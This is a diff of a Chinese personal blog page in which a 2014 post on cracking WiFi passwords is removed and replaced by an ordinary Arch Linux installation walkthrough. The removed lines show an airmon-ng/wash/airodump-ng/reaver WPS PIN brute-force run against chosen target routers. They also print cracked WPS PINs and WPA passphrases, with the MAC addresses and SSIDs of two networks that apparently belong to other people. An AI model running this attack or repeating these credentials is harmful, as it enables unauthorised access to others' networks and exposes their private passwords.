@@ -4,12 +4,19 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>wifi密码破解实战 | zhangyan&#39;s blog</title>
+    <title>archlinux安装笔记 | zhangyan&#39;s blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
     
     <meta name="author" content="张岩">
     
-    <meta name="description" content="1234airmon-ng start wlan0 #开启监听模式wash -i mon0 -C #查看所有开启WPS的无线路由长时间无反应按Ctrl+C，结束进程,这时记下你要破解的目标路由MAC.airodump-ng mon0 #网卡以混杂模式扫描所有频道—并显示所有AP的信息reaver -">
+    <meta name="description" content="一直听说archlinux挺折腾，一直没敢尝试。但是心里面总是很痒痒，正好赶上元旦放假，媳妇串休，在家呆着没事，折腾一下arch linux。
+安装
+安装介质
+直接去官网下了一个最新的iso，也可以使用usb安装
+进入安装环境
+使用下载回来的ISO引导系统，配置好网络。超简单，不多说。
+分区
+cfd">
     
     
     
@@ -68,15 +75,15 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2014/11/10/wifi密码破解实战/" title="wifi密码破解实战" itemprop="url">wifi密码破解实战</a>
+      <a href="/2015/01/02/archlinux折腾笔记/" title="archlinux安装笔记" itemprop="url">archlinux安装笔记</a>
   </h1>
   <p class="article-author">By
     
       <a href="http://yan.lingyun.io" title="张岩">张岩</a>
     </p>
   <p class="article-time">
-    <time datetime="2014-11-10T06:38:24.000Z" itemprop="datePublished">11月 10 2014</time>
-    更新日期:<time datetime="2014-11-10T06:38:24.000Z" itemprop="dateModified">11月 10 2014</time>
+    <time datetime="2015-01-02T04:19:40.000Z" itemprop="datePublished">1月 2 2015</time>
+    更新日期:<time datetime="2015-01-02T04:19:40.000Z" itemprop="dateModified">1月 2 2015</time>
     
   </p>
 </header>
@@ -85,18 +92,42 @@
 		
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
-		
+		<ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#一直听说archlinux挺折腾，一直没敢尝试。但是心里面总是很痒痒，正好赶上元旦放假，媳妇串休，在家呆着没事，折腾一下arch_linux。"><span class="toc-number">1.</span> <span class="toc-text">一直听说archlinux挺折腾，一直没敢尝试。但是心里面总是很痒痒，正好赶上元旦放假，媳妇串休，在家呆着没事，折腾一下arch linux。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安装"><span class="toc-number"></span> <span class="toc-text">安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装介质"><span class="toc-number"></span> <span class="toc-text">安装介质</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进入安装环境"><span class="toc-number"></span> <span class="toc-text">进入安装环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分区"><span class="toc-number">1.</span> <span class="toc-text">分区</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#配置安装源"><span class="toc-number">2.</span> <span class="toc-text">配置安装源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#开始安装"><span class="toc-number">3.</span> <span class="toc-text">开始安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#配置系统"><span class="toc-number">4.</span> <span class="toc-text">配置系统</span></a></li></ol>
 		</div>
 		
-		<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">airmon-ng start wlan0 <span class="comment">#开启监听模式</span></div><div class="line">wash -i mon0 -C <span class="comment">#查看所有开启WPS的无线路由长时间无反应按Ctrl+C，结束进程,这时记下你要破解的目标路由MAC.</span></div><div class="line">airodump-ng mon0 <span class="comment">#网卡以混杂模式扫描所有频道—并显示所有AP的信息</span></div><div class="line">reaver -i mon0 -b MAC <span class="operator">-a</span> -S -vv -c 频道 <span class="comment">#可以去睡觉了</span></div></pre></td></tr></table></figure>
-
-<p>一觉醒来</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">BC:D1:<span class="number">77</span>:F5:<span class="number">63</span>:<span class="number">6</span>A  WPA2 CCMP   PSK  TP-LINK_F5636A</div><div class="line">[+] <span class="number">92.54</span>% complete @ <span class="number">2014</span>-<span class="number">08</span>-<span class="number">22</span> <span class="number">23</span>:<span class="number">34</span>:<span class="number">31</span> (<span class="number">4</span> seconds/pin)</div><div class="line">[+] Max time remaining at this rate: <span class="number">0</span>:<span class="number">54</span>:<span class="number">44</span> (<span class="number">821</span> pins left <span class="keyword">to</span> <span class="keyword">try</span>)</div><div class="line">[+] Trying pin <span class="number">36861705</span></div><div class="line">[+] Sending EAPOL START request</div><div class="line">[+] Received identity request</div><div class="line">[+] Sending identity response</div><div class="line">[+] Received M1 <span class="keyword">message</span></div><div class="line">[+] Sending M2 <span class="keyword">message</span></div><div class="line">[+] Received M3 <span class="keyword">message</span></div><div class="line">[+] Sending M4 <span class="keyword">message</span></div><div class="line">[+] Received M5 <span class="keyword">message</span></div><div class="line">[+] Sending M6 <span class="keyword">message</span></div><div class="line">[+] Received M7 <span class="keyword">message</span></div><div class="line">[+] Sending WSC NACK</div><div class="line">[+] Sending WSC NACK</div><div class="line">[+] Pin cracked <span class="keyword">in</span> <span class="number">3068</span> seconds</div><div class="line">[+] WPS PIN: <span class="string">'36861705'</span></div><div class="line">[+] WPA PSK: <span class="string">'lzy230105'</span></div><div class="line">[+] AP SSID: <span class="string">'TP-LINK_F5636A'</span></div></pre></td></tr></table></figure>
-
-<p>又攻克一个</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[+] Max time remaining at <span class="keyword">this</span> rate: <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span> (<span class="number">0</span> pins left to <span class="keyword">try</span>)</div><div class="line">[+] Pin cracked <span class="keyword">in</span> <span class="number">7832</span> seconds</div><div class="line">[+] WPS PIN: <span class="string">'17366311'</span></div><div class="line">[+] WPA PSK: <span class="string">'jialili112358'</span></div><div class="line">[+] AP SSID: <span class="string">'jialili1001'</span></div><div class="line"><span class="number">9</span>C:<span class="number">21</span>:<span class="number">6</span>A:A6:<span class="number">3</span>A:DE WPA2 CCMP   PSK  jialili1001</div></pre></td></tr></table></figure>
-
-  
+		<h4 id="一直听说archlinux挺折腾，一直没敢尝试。但是心里面总是很痒痒，正好赶上元旦放假，媳妇串休，在家呆着没事，折腾一下arch_linux。">一直听说archlinux挺折腾，一直没敢尝试。但是心里面总是很痒痒，正好赶上元旦放假，媳妇串休，在家呆着没事，折腾一下arch linux。</h4>
+<h2 id="安装">安装</h2>
+<h3 id="安装介质">安装介质</h3>
+<p>直接去官网下了一个最新的iso，也可以使用usb安装</p>
+<h3 id="进入安装环境">进入安装环境</h3>
+<p>使用下载回来的ISO引导系统，配置好网络。超简单，不多说。</p>
+<h4 id="分区">分区</h4>
+<pre><code>cfdisk <span class="comment">#分区工具，也可以使用fdisk</span>
+lsblk <span class="operator">-f</span> <span class="comment">#查看分区信息</span>
+mkfs.ext4 /dev/sda1 <span class="comment">#格式化分区</span>
+mount /dev/sda1 /mnt <span class="comment">#挂载系统</span>
+</code></pre><h4 id="配置安装源">配置安装源</h4>
+<pre><code>rm /etc/pacman.d/mirrorlist
+nano <span class="regexp">/etc/pacman.d/mirrorlist #添加网易源 Server = http:/</span><span class="regexp">/mirrors.163.com/archlinux/</span>$repo<span class="regexp">/os/</span>$arch
+</code></pre><h4 id="开始安装">开始安装</h4>
+<pre><code>pacstrap -i /mnt <span class="keyword">base</span> <span class="keyword">base</span>-devel
+pacman-key --init &amp;&amp; pacman-key --populate archlinux <span class="preprocessor">#若 pacman 报告 <span class="keyword">error</span>: failed to commit transaction (invalid or corrupted package), 执行此命令</span>
+</code></pre><h4 id="配置系统">配置系统</h4>
+<pre><code><span class="input"><span class="prompt">genfstab -U -p /mnt &gt;&gt;</span> /mnt/etc/fstab <span class="comment">#生成fstab</span></span>
+arch-chroot /mnt /bin/bash <span class="comment">#chroot到系统</span>
+<span class="comment"># nano /etc/locale.gen</span>
+en_US.<span class="constant">UTF</span>-<span class="number">8</span> <span class="constant">UTF</span>-<span class="number">8</span>
+zh_CN.<span class="constant">UTF</span>-<span class="number">8</span> <span class="constant">UTF</span>-<span class="number">8</span>
+zh_TW.<span class="constant">UTF</span>-<span class="number">8</span> <span class="constant">UTF</span>-<span class="number">8</span>
+locale-gen <span class="comment">#生成指定的本地化文件</span>
+echo <span class="constant">LANG</span>=en_US.<span class="constant">UTF</span>-<span class="number">8</span> &gt; <span class="regexp">/etc/locale</span>.conf <span class="comment">#将系统 locale 设置为en_US.UTF-8</span>
+ln -s /usr/share/zoneinfo/<span class="constant">Asia</span>/<span class="constant">Shanghai</span> /etc/localtime <span class="comment">#配置时区</span>
+hwclock --systohc --utc
+pacman -<span class="constant">S</span> grub <span class="comment">#安装grub</span>
+grub-install --target=i386-pc --recheck /dev/sda
+systemctl enable dhcpcd<span class="variable">@interface_name</span>.service
+grub-mkconfig -o /boot/grub/grub.cfg
+</code></pre>  
 	</div>
 		<footer class="article-footer clearfix">
 
@@ -105,7 +136,7 @@
 
 <div class="article-share" id="share">
 
-  <div data-url="http://yan.lingyun.io/2014/11/10/wifi密码破解实战/" data-title="wifi密码破解实战 | zhangyan&#39;s blog" data-tsina="null" class="share clearfix">
+  <div data-url="http://yan.lingyun.io/2015/01/02/archlinux折腾笔记/" data-title="archlinux安装笔记 | zhangyan&#39;s blog" data-tsina="null" class="share clearfix">
   </div>
 
 </div>
@@ -114,19 +145,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2014/11/13/ubuntu14.04网卡重启的改变/" title="ubuntu14.04网卡重启的改变">
-  <strong>PREVIOUS:</strong><br/>
-  <span>
-  ubuntu14.04网卡重启的改变</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2014/11/10/Systemd服务管理/"  title="Systemd服务管理">
+<a href="/2014/12/27/oracle rac 基本维护操作/"  title="oracle rac 基本维护操作">
  <strong>NEXT:</strong><br/> 
- <span>Systemd服务管理
+ <span>oracle rac 基本维护操作
 </span>
 </a>
 </div>
@@ -143,7 +166,7 @@
 
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
-  
+  <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#一直听说archlinux挺折腾，一直没敢尝试。但是心里面总是很痒痒，正好赶上元旦放假，媳妇串休，在家呆着没事，折腾一下arch_linux。"><span class="toc-number">1.</span> <span class="toc-text">一直听说archlinux挺折腾，一直没敢尝试。但是心里面总是很痒痒，正好赶上元旦放假，媳妇串休，在家呆着没事，折腾一下arch linux。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安装"><span class="toc-number"></span> <span class="toc-text">安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装介质"><span class="toc-number"></span> <span class="toc-text">安装介质</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进入安装环境"><span class="toc-number"></span> <span class="toc-text">进入安装环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分区"><span class="toc-number">1.</span> <span class="toc-text">分区</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#配置安装源"><span class="toc-number">2.</span> <span class="toc-text">配置安装源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#开始安装"><span class="toc-number">3.</span> <span class="toc-text">开始安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#配置系统"><span class="toc-number">4.</span> <span class="toc-text">配置系统</span></a></li></ol>
   </div>
 
 <div id="asidepart">
